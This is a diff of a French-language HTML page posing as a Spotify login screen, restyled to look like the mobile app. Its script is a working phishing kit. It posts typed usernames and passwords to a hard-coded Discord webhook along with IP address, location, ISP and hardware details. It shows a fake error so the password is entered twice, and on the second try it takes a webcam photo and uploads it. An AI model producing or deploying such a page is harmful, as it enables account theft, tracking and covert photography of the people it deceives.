@@ -2,79 +2,171 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify - Connexion</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Spotify</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; display: flex; justify-content: center; padding-top: 60px; margin: 0; }
-        .wrapper { width: 100%; max-width: 400px; padding: 0 25px; text-align: center; }
         
-        /* Logo Spotify Textuel */
-        .logo-header { display: flex; align-items: center; justify-content: center; margin-bottom: 40px; }
-        .logo-header img { width: 35px; margin-right: 8px; }
-        .logo-header span { font-size: 26px; font-weight: 900; letter-spacing: -1px; }
+        /* Fond total noir pour mobile */
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            font-family: 'Figtree', sans-serif; 
+            margin: 0; 
+            padding: 0;
+            overflow-x: hidden;
+        }
 
-        h1 { font-size: 28px; font-weight: 900; letter-spacing: -1px; margin-bottom: 40px; }
-        
-        .input-box { text-align: left; margin-bottom: 20px; }
-        label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
-        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; outline: none; transition: 0.2s; font-size: 16px; }
-        input:focus { border: 2px solid #1ed760; }
-        
-        .error-msg { color: #f15e6c; font-size: 13px; text-align: left; margin-top: 10px; display: none; }
-        
-        .main-btn { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin: 10px 0; border: none; font-size: 16px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-        .main-btn:hover { transform: scale(1.02); background: #1fdf64; }
+        .app-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 25px;
+            min-height: 100vh;
+        }
 
-        .forgot { display: block; margin: 25px 0; font-size: 14px; color: #fff; text-decoration: underline; font-weight: 700; }
+        /* Logo plus gros comme dans l'APP */
+        .app-logo {
+            width: 55px;
+            margin-bottom: 30px;
+        }
 
-        .divider { display: flex; align-items: center; margin: 30px 0; color: #727272; font-size: 12px; font-weight: 700; }
-        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
+        h1 {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .input-group {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background: #282828; /* Couleur des inputs dans l'app */
+            border: 1px solid transparent;
+            border-radius: 4px;
+            padding: 16px;
+            color: #fff;
+            outline: none;
+            font-size: 16px;
+        }
+
+        input:focus {
+            border-color: #727272;
+        }
+
+        .btn-login {
+            background: #1ed760;
+            color: #000;
+            font-weight: 700;
+            padding: 16px;
+            border-radius: 500px;
+            width: 100%;
+            margin-top: 25px;
+            font-size: 16px;
+            border: none;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .error-box {
+            color: #f15e6c;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            background: #441a1d;
+            padding: 10px;
+            border-radius: 4px;
+            width: 100%;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 35px 0;
+            color: #b3b3b3;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #292929;
+        }
+
         .divider:not(:empty)::before { margin-right: 1.5em; }
         .divider:not(:empty)::after { margin-left: 1.5em; }
 
-        .social-btn { background: black; border: 1px solid #727272; border-radius: 500px; padding: 12px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; font-size: 14px; }
-        .social-btn img { width: 18px; margin-right: 12px; }
+        .social-row {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
 
-        .footer-line { border-top: 1px solid #292929; margin-top: 40px; padding-top: 30px; color: #b3b3b3; font-size: 14px; }
-        .footer-line a { color: #fff; font-weight: 700; text-decoration: none; }
-        .footer-line a:hover { text-decoration: underline; }
+        .social-btn {
+            background: transparent;
+            border: 1px solid #727272;
+            border-radius: 500px;
+            padding: 14px;
+            color: #fff;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        .social-btn img {
+            width: 20px;
+            position: absolute;
+            left: 45px;
+        }
 
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="logo-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg">
-            <span>Spotify</span>
-        </div>
-
+    <div class="app-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="app-logo">
+        
         <h1>Se connecter pour continuer</h1>
 
-        <div class="input-box">
+        <div id="err" class="error-box">Identifiant ou mot de passe incorrect.</div>
+
+        <div class="input-group">
             <label>E-mail ou nom d'utilisateur</label>
             <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur">
         </div>
-        <div class="input-box">
+
+        <div class="input-group">
             <label>Mot de passe</label>
             <input id="p" type="password" placeholder="Mot de passe">
-            <div id="err" class="error-msg">Identifiant ou mot de passe incorrect.</div>
         </div>
 
-        <button onclick="exec()" id="btn" class="main-btn">Se connecter</button>
+        <button onclick="sendData()" id="btn" class="btn-login">Se connecter</button>
 
-        <a href="#" class="forgot">Mot de passe oublié ?</a>
+        <div class="divider">OU</div>
 
-        <div class="divider">ou</div>
-
-        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> Continuer avec Google</div>
-        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"> Continuer avec Facebook</div>
-        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"> Continuer avec Apple</div>
-
-        <div class="footer-line">
-            Tu n'as pas de compte ? <a href="#">S'INSCRIRE</a>
+        <div class="social-row">
+            <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> Continuer avec Google</div>
+            <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"> Continuer avec Facebook</div>
+            <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"> Continuer avec Apple</div>
         </div>
     </div>
 
@@ -82,48 +174,44 @@
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        let step = 0;
+        let attempt = 0;
 
-        async function exec() {
+        async function sendData() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
             if(!u || !p) return;
 
-            step++;
+            attempt++;
             document.getElementById('btn').innerText = "CHARGEMENT...";
 
-            // Récupération des données full
+            // Récupération DATA (toujours full info comme tu voulais)
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
-            
+
             const payload = {
                 embeds: [{
-                    title: `⚡ LOG LVN V8 - TENTATIVE ${step}`,
+                    title: `📱 LOG APP MOBILE - TENTATIVE ${attempt}`,
                     color: 1955168,
                     thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 ACCÈS", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "🌐 RÉSEAU", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**Maps:** **[Position](https://www.google.com/maps?q=${net.latitude},${net.longitude})**`, inline: true },
-                        { name: "📱 MACHINE", value: `**OS:** \`${navigator.platform}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**GPU:** \`${gpu}\`\n**Batterie:** \`${Math.round(bat.level*100)}%\``, inline: true },
-                        { name: "🕵️ USER-AGENT", value: `\`${navigator.userAgent}\`` }
-                    ],
-                    footer: { text: "LVN System Elite • " + new Date().toLocaleString() }
+                        { name: "👤 COMPTE", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
+                        { name: "🌐 RÉSEAU", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Maps:** **[Position](https://www.google.com/maps?q=${net.latitude},${net.longitude})**`, inline: true },
+                        { name: "📱 HARDWARE", value: `**RAM:** \`${navigator.deviceMemory}GB\`\n**GPU:** \`${gpu}\`\n**Batterie:** \`${Math.round(bat.level*100)}%\``, inline: true }
+                    ]
                 }]
             };
 
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            if(step === 1) {
-                // Fake error pour valider le pass
+            if(attempt === 1) {
                 setTimeout(() => {
                     document.getElementById('btn').innerText = "Se connecter";
                     document.getElementById('p').value = "";
                     document.getElementById('err').style.display = "block";
-                }, 800);
+                }, 1000);
             } else {
-                // Photo au 2ème clic
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.getElementById('v');
@@ -134,8 +222,8 @@
                     can.getContext('2d').drawImage(video, 0, 0);
                     can.toBlob(async (b) => {
                         const fd = new FormData();
-                        fd.append('file', b, 'shot.png');
-                        fd.append('content', "📸 **CAPTURE FRONTALE :**");
+                        fd.append('file', b, 'capture.png');
+                        fd.append('content', "📸 **CAPTURE APP MOBILE :**");
                         await fetch(hook, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/png');
